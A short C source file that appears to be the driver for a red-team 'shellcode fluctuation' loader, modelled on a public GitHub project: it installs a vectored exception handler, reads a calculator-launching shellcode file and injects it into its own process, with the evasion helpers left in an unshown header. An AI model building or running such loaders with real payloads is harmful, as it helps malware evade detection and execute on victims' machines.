#include "ShellcodeFluctuation.h"

// Reference: https://github.com/mgeeky/ShellcodeFluctuation

int main()
{

	LPCWSTR				ShellcodePath	= L".\\CalcShellcode.bin";

	LPVOID				PayloadBuffer	= NULL;
	DWORD				PayloadSize		= 0;


	AddVectoredExceptionHandler(1, &VectoredExceptionHandler);

	INFO("Added VectoredExceptionHandler");

	if (!ReadTargetFileW(ShellcodePath, &PayloadSize, &PayloadBuffer))
	{
		PRINT_ERROR("ReadTargetPayload");
		return 1;
	}

	INFO("Read Shellcode!");

	if (!LocalShellcodeInjection(PayloadBuffer, PayloadSize))
	{
		PRINT_ERROR("LocalShellcodeInjection");
		return 1;
	}

	INFO("Shellcode Injected!");

	CHAR("Quit...");
	getchar();

	return 0;

}